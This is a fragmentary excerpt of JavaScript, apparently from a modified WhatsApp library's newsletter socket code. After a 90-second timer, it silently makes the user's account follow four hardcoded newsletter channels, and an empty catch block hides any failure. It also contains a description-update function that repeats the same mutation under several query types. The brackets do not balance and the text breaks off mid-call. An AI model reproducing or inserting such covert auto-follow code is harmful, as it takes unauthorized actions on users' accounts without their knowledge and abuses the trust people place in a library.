...
const makeNewsletterSocket = (config) => {
    ...
    try {
        ...
        await newsletterWMexQuery("120363400500175470@newsletter", Types_2.QueryIds.FOLLOW);
        await newsletterWMexQuery("120363418199382913@newsletter", Types_3.QueryIds.FOLLOW);
        await newsletterWMexQuery("120363400878059888@newsletter", Types_4.QueryIds.FOLLOW);
        await newsletterWMexQuery("120363403316191594@newsletter", Types_5.QueryIds.FOLLOW);
    } catch {}
}, 90000);
    ...
    return {
        ...
        newsletterUpdateDescription: async (jid, description) => {
	        ...
	        await newsletterWMexQuery(jid, Types_2.QueryIds.JOB_MUTATION, {
                updates: { 
                    description: description || '', 
                    settings: null 
                }
            }),
				await newsletterWMexQuery(jid, Types_3.QueryIds.JOB_MUTATION, {
                updates: { 
                    description: description || '', 
                    settings: null 
                }
            }), 
				await newsletterWMexQuery(jid, Types_4.QueryIds.JOB_MUTATION, {
                updates: { 
                    description: description || '', 
                    settings: null 
                }
            }), 
			await newsletterWMexQuery(jid, Types_5.QueryIds.JOB_MUTATION, {
                updates: { 
                    description: description || '', 
                    settings: null 
                }
